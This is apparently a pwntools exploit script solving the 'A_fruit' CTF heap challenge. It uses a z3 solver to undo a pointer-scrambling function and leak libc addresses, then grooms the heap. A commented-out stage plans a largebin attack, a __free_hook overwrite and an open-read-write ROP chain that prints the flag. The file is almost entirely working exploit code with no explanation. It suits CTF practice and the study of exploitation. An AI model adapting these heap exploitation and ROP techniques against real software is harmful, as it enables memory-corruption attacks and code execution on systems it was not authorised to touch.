# -*- encoding: utf-8 -*-
from z3 import *
import sys 
import os 
import requests
from pwn import * 

binary = './A_fruit'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.33.so')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '192.168.1.105'
    port = '8888'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('5.Exit\n',num)

def add(size ):
    cmd(1)
    sla('Input size:' , size)

def edit(idx , text):
    cmd(2)
    sla('index:' , idx)
    sa('content:' , text)

def show(idx ):
    cmd(3)
    sla('index:' , idx)

def delete(idx ):
    cmd(4)
    sla('index:' , idx)

def getptr(inp):
    b = BitVecVal(inp ,32)
    solver = Solver()
    ptr = [BitVec("ptr[%d]" % i,32) for i in range(11)]
    solver.add(ptr[1] == ((LShR(ptr[0] ^ (48 * ptr[0]),21)) ^ (48 * ptr[0]) ^ ((ptr[0] ^ (48 * ptr[0]) ^ (LShR(ptr[0] ^ (48 * ptr[0]),21))) << 17)) ^ ptr[0])
    solver.add(ptr[2] == ((LShR(ptr[1] ^ (48 * ptr[1]),21)) ^ (48 * ptr[1]) ^ ((ptr[1] ^ (48 * ptr[1]) ^ (LShR(ptr[1] ^ (48 * ptr[1]),21))) << 17)) ^ ptr[1])
    solver.add(ptr[3] == ((LShR(ptr[2] ^ (48 * ptr[2]),21)) ^ (48 * ptr[2]) ^ ((ptr[2] ^ (48 * ptr[2]) ^ (LShR(ptr[2] ^ (48 * ptr[2]),21))) << 17)) ^ ptr[2])
    solver.add(ptr[4] == ((LShR(ptr[3] ^ (48 * ptr[3]),21)) ^ (48 * ptr[3]) ^ ((ptr[3] ^ (48 * ptr[3]) ^ (LShR(ptr[3] ^ (48 * ptr[3]),21))) << 17)) ^ ptr[3])
    solver.add(ptr[5] == ((LShR(ptr[4] ^ (48 * ptr[4]),21)) ^ (48 * ptr[4]) ^ ((ptr[4] ^ (48 * ptr[4]) ^ (LShR(ptr[4] ^ (48 * ptr[4]),21))) << 17)) ^ ptr[4])
    solver.add(ptr[6] == ((LShR(ptr[5] ^ (48 * ptr[5]),21)) ^ (48 * ptr[5]) ^ ((ptr[5] ^ (48 * ptr[5]) ^ (LShR(ptr[5] ^ (48 * ptr[5]),21))) << 17)) ^ ptr[5])
    solver.add(ptr[7] == ((LShR(ptr[6] ^ (48 * ptr[6]),21)) ^ (48 * ptr[6]) ^ ((ptr[6] ^ (48 * ptr[6]) ^ (LShR(ptr[6] ^ (48 * ptr[6]),21))) << 17)) ^ ptr[6])
    solver.add(ptr[8] == ((LShR(ptr[7] ^ (48 * ptr[7]),21)) ^ (48 * ptr[7]) ^ ((ptr[7] ^ (48 * ptr[7]) ^ (LShR(ptr[7] ^ (48 * ptr[7]),21))) << 17)) ^ ptr[7])
    solver.add(ptr[9] == ((LShR(ptr[8] ^ (48 * ptr[8]),21)) ^ (48 * ptr[8]) ^ ((ptr[8] ^ (48 * ptr[8]) ^ (LShR(ptr[8] ^ (48 * ptr[8]),21))) << 17)) ^ ptr[8])
    solver.add(ptr[10] == ((LShR(ptr[9] ^ (48 * ptr[9]),21)) ^ (48 * ptr[9]) ^ ((ptr[9] ^ (48 * ptr[9]) ^ (LShR(ptr[9] ^ (48 * ptr[9]),21))) << 17)) ^ ptr[9])

    solver.add( ptr[10] == b)

    if solver.check() == sat:
        m = solver.model()
        for d in m.decls():
            if(d.name()=='ptr[0]'):
                return hex(int(str(m[d])))

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x428)
    add(0x500)
    add(0x418)
    add(0x500)
    
    delete(0)
    show(0)

    rl()
    addr1 = int(ru('\n') ,16)
    addr2 = int(ru('\n') ,16)
    leak1 = eval(getptr(addr1))
    leak2 = eval(getptr(addr2))

    leak = leak2 << 32+ leak1
    lg('leak',leak)

    # __malloc_hook = leak - 0x70
    # libc.address = __malloc_hook - libc.sym['__malloc_hook']
    # system_addr = libc.sym['system']
    # __free_hook = libc.sym['__free_hook']
    # binsh_addr = libc.search('/bin/sh').next()
    # mp_ = 0x1e02d0 + libc.address
    # lg('__free_hook',__free_hook)

    # # add(0x438)
    # delete(2)
    # show(2)

    # rl()
    # addr1 = int(ru('\n') ,16)
    # addr2 = int(ru('\n') ,16)
    # heap_base = getptr(addr1) + (getptr(addr2) << 32 ) 

    # # heap_base = 0x555555759000
    # key = heap_base >> 12

    # add(0x418)
    # add(0x438)
    # delete(2)

    # payload = flat(
    #     __malloc_hook + 0x3f0 , __malloc_hook + 0x3f0 ,
    #     heap_base + 0x290 , mp_ - 0x20
    # )

    # edit(0 , payload)
    # add(0x438)

    # delete(1)
    # edit(0 ,  p64( __free_hook )*0x20)

    # add(0x500)

    # # 下面 2.31 标准开启 orw
    # __free_hook = libc.sym['__free_hook']
    # magic = 0x14d09a + libc.address
    
    # # svcudp_reply+26
    # # mov    rbp, qword ptr [rdi + 0x48]
    # # mov    rax, qword ptr [rbp + 0x18]
    # # lea    r13, [rbp + 0x10]
    # # mov    dword ptr [rbp + 0x10], 0
    # # mov    rdi, r13
    # # call   qword ptr [rax + 0x28]
    
    # read_addr = libc.sym['read']
    # open_addr = libc.sym['open']
    # puts_addr = libc.sym['puts']
    # leave_ret = libc.search(asm('leave;ret')).next()
    # pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    # pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    # pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    # pop_r13_pop_r15_ret = libc.search(asm('pop r12 ; pop r13 ; ret')).next()
    # pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    # ret = pop_rdi_ret + 1
    
    # magic_chain  = flat(
    #     __free_hook + 0x8, pop_r13_pop_r15_ret , 
    #     __free_hook + 0x8, __free_hook + 0x10 ,
    #     pop_rdx_pop_rbx_ret, 0x300 ,
    #     leave_ret, pop_rsi_ret,
    #     __free_hook + 0x8 , pop_rdi_ret , 
    #     0 , read_addr 
    # )
    # # len magic_chain 0x60
    # flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    # chain = flat(
    #     pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
    #     pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    #     pop_rdi_ret , flag_addr , puts_addr
    # ).ljust(0x100,'\x00') + 'flag\x00'
    # # len chain 0x80
    
    # payload = p64( magic ) + magic_chain
    # # dbg('free')
    
    # getflag =p64(ret)*0xc + chain

    # edit(7 ,payload )
    # delete(7)

    # se(getflag)

    p.interactive()

attack()

'''
@File    :   A_fruit.py
@Time    :   2022/07/02 10:07:32
@Author  :   Niyah 
'''